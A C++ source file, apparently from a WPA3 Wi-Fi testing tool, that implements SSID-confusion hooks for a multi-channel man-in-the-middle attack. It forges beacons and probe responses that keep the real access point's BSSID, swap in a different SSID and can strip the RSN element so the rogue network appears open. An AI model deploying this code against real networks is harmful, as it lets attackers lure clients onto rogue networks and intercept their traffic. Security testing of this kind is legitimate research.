#include "attacks/mc_mitm/ssid_confusion_hooks.h"
#include "attacks/mc_mitm/client_state.h"
#include "attacks/mc_mitm/mc_mitm.h"
#include "attacks/mc_mitm/wifi_util.h"
namespace wpa3_tester {
using namespace Tins;
using namespace std;

Dot11Beacon make_confused_beacon(const Dot11Beacon &real, const string &confused_ssid, const bool strip_rsn){
	auto b = Dot11Beacon();
	b.addr1(real.addr1());
	b.addr2(real.addr2()); // BSSID kept identical to real AP — key to the attack
	b.addr3(real.addr3());
	b.timestamp(real.timestamp());
	b.interval(real.interval());
	b.capabilities() = real.capabilities();

	for(const auto &opt: real.options()){
		if(opt.option() == Dot11::SSID){
			b.add_option({Dot11::SSID,
				static_cast<uint8_t>(confused_ssid.size()),
				reinterpret_cast<const uint8_t*>(confused_ssid.data())});
		} else if(strip_rsn && opt.option() == Dot11::RSN){
			continue; // drop RSN IE — rogue beacon appears as an open network
		} else{
			b.add_option(opt);
		}
	}
	return b;
}

Dot11ProbeResponse make_confused_probe_resp(const Dot11ProbeResponse &real, const string &confused_ssid,
											const bool strip_rsn){
	auto resp = Dot11ProbeResponse();
	resp.addr1(real.addr1());
	resp.addr2(real.addr2());
	resp.addr3(real.addr3());
	resp.timestamp(real.timestamp());
	resp.interval(real.interval());
	resp.capabilities() = real.capabilities();

	for(const auto &opt: real.options()){
		if(opt.option() == Dot11::SSID){
			resp.add_option({Dot11::SSID,
				static_cast<uint8_t>(confused_ssid.size()),
				reinterpret_cast<const uint8_t*>(confused_ssid.data())});
		} else if(strip_rsn && opt.option() == Dot11::RSN){
			continue;
		} else{
			resp.add_option(opt);
		}
	}
	return resp;
}

// change probe responses SSID
void SsidConfusionHooks::on_probe_response(Dot11ProbeResponse &resp) {
	resp = make_confused_probe_resp(resp, confused_ssid_, strip_rsn_);
}

// add periodic beacon on rogue with fake SSID
bool SsidConfusionHooks::send_periodic_beacon(McMitm &m) {
	auto b = make_confused_beacon(*m.beacon, confused_ssid_, strip_rsn_);
	m.send_to_rogue(b);
	return false; // still send CSA cwitch beacon on real
}

bool SsidConfusionHooks::on_assoc_request(McMitm &/*m*/, Dot11 &/*dot11*/,
										  HWAddress<6>) {
	return false;
	/*const auto *assoc = dot11.find_pdu<Dot11AssocRequest>();
	if (!assoc) return false;

	auto out = make_real_ssid_assoc_req(*assoc, real_ssid_);
	out.addr1(m.ap_mac);
	out.addr3(m.ap_mac);

	m.send_to_real(out);
	m.client_state.update_state(ClientState::Associated);
	return true;*/
}
}